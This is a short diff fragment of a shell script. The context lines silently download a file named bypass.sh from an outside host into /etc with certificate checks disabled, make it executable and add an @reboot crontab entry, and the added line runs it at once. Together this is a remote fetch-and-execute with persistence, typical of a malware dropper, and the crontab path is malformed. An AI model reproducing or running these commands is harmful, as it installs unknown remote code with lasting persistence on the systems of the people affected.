@@ -3,5 +3,6 @@ curl -sk -o /etc/bypass.sh http://i.tv-lounge.eu/test/bypass.sh
   chmod +x /etc/bypass.sh > /dev/null 2>&1
   (crontab -l | sed -e '/bypass.sh/d') | crontab - 2>/dev/null
   (crontab -l 2>/dev/null; echo "@reboot /etc//etc/bypass.sh ") | crontab - > /dev/null 2>&1
+  /etc/bypass.sh
   echo "...done"
   sleep 2
